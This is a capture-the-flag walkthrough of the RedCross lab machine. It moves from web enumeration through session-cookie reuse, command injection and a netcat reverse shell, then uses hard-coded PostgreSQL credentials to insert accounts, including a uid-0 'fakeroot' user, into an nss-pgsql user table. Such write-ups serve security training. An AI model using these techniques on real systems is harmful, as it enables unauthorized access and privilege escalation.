## RedCross

### Lab Details 

- Difficulty: Medium
- Type: Web, Session Hijacking, Command Injection, PostgreSQL, Linux,

#### Enumeration
- run nmap
- from the scan output of nmap we can see that the web application running on port 443 has domain name `commonName=intra.redcross.htb` add that to `/etc/hosts`
- enumerate directories using `feroxbuster`
```bash
$ feroxbuster -u https://intra.redcross.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt -k
                                                                                                                                                                        
 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.11.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ https://intra.redcross.htb
 🚀  Threads               │ 50
 📖  Wordlist              │ /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
 👌  Status Codes          │ All Status Codes!
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.11.0
 🔎  Extract Links         │ true
 🏁  HTTP methods          │ [GET]
 🔓  Insecure              │ true
 🔃  Recursion Depth       │ 4
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Management Menu™
──────────────────────────────────────────────────
404      GET        9l       31w      281c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
403      GET        9l       28w      284c Auto-filtering found 404-like response and created new filter; toggle off with --dont-filter
301      GET        9l       28w      327c https://intra.redcross.htb/images => https://intra.redcross.htb/images/
200      GET       26l      116w     7986c https://intra.redcross.htb/images/logo.png
302      GET        1l       26w      463c https://intra.redcross.htb/ => https://intra.redcross.htb/?page=login
301      GET        9l       28w      334c https://intra.redcross.htb/documentation => https://intra.redcross.htb/documentation/
301      GET        9l       28w      326c https://intra.redcross.htb/pages => https://intra.redcross.htb/pages/

```
 - enumerate subdomain using `wfuzz`
```bash
$ wfuzz -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host:FUZZ.redcross.htb" https://10.10.10.113
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: https://10.10.10.113/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                
=====================================================================
<snip>
000000024:   302        0 L      18 W       363 Ch      "admin"
```
- enumerate files using `ffuf`
```bash
ffuf -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt  -u https://intra.redcross.htb/documentation/FUZZ -e .pdf

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : https://intra.redcross.htb/documentation/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-small.txt
 :: Extensions       : .pdf 
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________


<snip>
account-signup.pdf      [Status: 200, Size: 26001, Words: 348, Lines: 260, Duration: 347ms]
```
- pdf file states we can request for an account if we enter the correct info into the form
![[pdf.png]]
#### Initial Foothold 
- after submitting the form at `https://intra.redcross.htb/?page=contact`
- we get a temporary credential `guest:guest`
![[post_form.png]]
- we can use the temporary credential to login to `infra.redcross.htb`
- `infra.redcross.htb` assign a `PHPSESSID` to the logged in user
![[guest_access_intra.png]]
- we can attempt to reuse the `PHPSESSID` with `admin.redcross.htb`
- we get access to the admin dashboard
![[Medium/Unix/RedCross/admin_dashboard.png]]
- go through all the input field on the site, the "Whitelist IP Address:" is vulnerable to command injection 
- it does filter user input however not with post request with `deny` action
![[XSS.png]]
- which we can inject a RCE 
![[payload_burp.png]]
```bash
$ nc -lnvp 9000
listening on [any] 9000 ...
connect to [10.10.14.14] from (UNKNOWN) [10.10.10.113] 56652
$ whoami
whoami
www-data
$ python -c 'import pty; pty.spawn("/bin/bash")'
python -c 'import pty; pty.spawn("/bin/bash")'
www-data@redcross:/var/www/html/admin/pages$ ls
ls
actions.php  cpanel.php    header.php  users.php
bottom.php   firewall.php  login.php
```

#### Lateral Movement (If any)
- going through the pages
- we found below connection string to `postgresql` database
```bash
www-data@redcross:/var/www/html/admin/pages$ cat actions.php
<snip>
if($action==='del'){
	header('refresh:1;url=/?page=users');
	$uid=$_POST['uid'];
	$dbconn = pg_connect("host=127.0.0.1 dbname=unix user=unixusrmgr password=dheu%7wjx8B&");
	$result = pg_prepare($dbconn, "q1", "delete from passwd_table where uid = $1");
	$result = pg_execute($dbconn, "q1", array($uid));
	echo "User account deleted";
}
?>
```
- the database is using `nss-pgsql` which allows admin to authenticate UNIX groups and users using a PostgreSQL database
- we can attempt to injection users in the database and the database will create the user in the system
- below is attempt to insert user `attacker` into the database
```sql
www-data@redcross:/var/www/html/admin/pages$ psql -h 127.0.0.1 -U unixusrmgr unix
<l/admin/pages$ psql -h 127.0.0.1 -U unixusrmgr unix
Password for user unixusrmgr: dheu%7wjx8B&

psql (11.22 (Debian 11.22-0+deb10u1), server 9.6.7)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

unix=> \d
\d
WARNING: terminal is not fully functional
-  (press RETURN)
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | group_id     | sequence | postgres
 public | group_table  | table    | postgres
 public | passwd_table | table    | postgres
 public | shadow_table | table    | postgres
 public | user_id      | sequence | postgres
 public | usergroups   | table    | postgres
(6 rows)

(END)select * from user_id
-log file: eelleecctt  **  ffrroomm  uusseerr__iidd...skipping...
              List of relations
 Schema |     Name     |   Type   |  Owner   
--------+--------------+----------+----------
 public | group_id     | sequence | postgres
 public | group_table  | table    | postgres
 public | passwd_table | table    | postgres
 public | shadow_table | table    | postgres
 public | user_id      | sequence | postgres
 public | usergroups   | table    | postgres
(6 rows)
unix=> select * from passwd_table;
select * from passwd_table;
WARNING: terminal is not fully functional
-  (press RETURN)
 username |               passwd               | uid  | gid  | gecos |    homedi
r     |   shell   
----------+------------------------------------+------+------+-------+----------
------+-----------
 tricia   | $1$WFsH/kvS$5gAjMYSvbpZFNu//uMPmp. | 2018 | 1001 |       | /var/jail
/home | /bin/bash
(1 row)
unix=> INSERT INTO passwd_table (username, passwd,  gid, homedir) values ('attacker', '$1$rHiZD5hy$BQzYl2LANNJFwH1.waX.I.' , 0, '/');
<r', '$1$rHiZD5hy$BQzYl2LANNJFwH1.waX.I.' , 0, '/');
INSERT 0 1

```
- use `openssl` to generate the hashed password
```bash
$ openssl passwd -1 password123
$1$rHiZD5hy$BQzYl2LANNJFwH1.waX.I.
```
- ssh as attacker
```
$ ssh attacker@10.10.10.113
```
#### Privilege Escalation
- since we know that the `pgsql` database is managing users on the system 
- we can attempt to search additional credentials relating to the `pgsql` database
- check config files of `nss-pgsql` 
```
attacker@redcross:/$ ls /etc
-rw-r--r--  1 root     root      1341 Jun  8  2018 nss-pgsql.conf
-rw-rw----  1 root     root       540 Jun  8  2018 nss-pgsql-root.conf
-rw-------  1 root     root       516 Jun  8  2018 pam_pgsql.conf

attacker@redcross:/etc$ cat nss-pgsql-root.conf
shadowconnectionstring = hostaddr=127.0.0.1 dbname=unix user=unixnssroot password=30jdsklj4d_3 connect_timeout=1
shadowbyname = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE username = $1 ORDER BY lastchange DESC LIMIT 1;
shadow = SELECT username, passwd, date_part('day',lastchange - '01/01/1970'), min, max, warn, inact, expire, flag FROM shadow_table WHERE (username,lastchange) IN (SELECT username, MAX(lastchange) FROM shadow_table GROUP BY username);
attacker@redcross:/etc$ psql -h localhost -U unixnssroot password=30jdsklj4d_3
psql: FATAL:  database "unixnssroot" does not exist

```
- we found the root user of the `pgsql` database
- we can attempt to authenticate to the database and create a user with `uid` of 0
 ```
attacker@redcross:/etc$ psql -h localhost -U unixnssroot unix password=30jdsklj4d_3
psql: warning: extra command-line argument "password=30jdsklj4d_3" ignored
Password for user unixnssroot: 
psql (11.22 (Debian 11.22-0+deb10u1), server 9.6.7)
SSL connection (protocol: TLSv1.3, cipher: TLS_AES_256_GCM_SHA384, bits: 256, compression: off)
Type "help" for help.

unix=> insert into passwd_table (username, passwd, uid, gid, homedir) values ('fakeroot', '$1$rHiZD5hy$BQzYl2LANNJFwH1.waX.I.', 0, 0, '/');
INSERT 0 1

attacker@redcross:/etc$ su fakeroot
Password: 
fakeroot@redcross:/etc# id
uid=0(fakeroot) gid=0(root) groups=0(root)
fakeroot@redcross:/etc# cd /root
fakeroot@redcross:/root# ls
bin  Haraka-2.8.8  root.txt

```
#### Resources

#### Lesson Learned
- Injection user into Linux system  with `nss-pgsql`& `pgsql` running
- Understood the use cases for different web enumeration tools
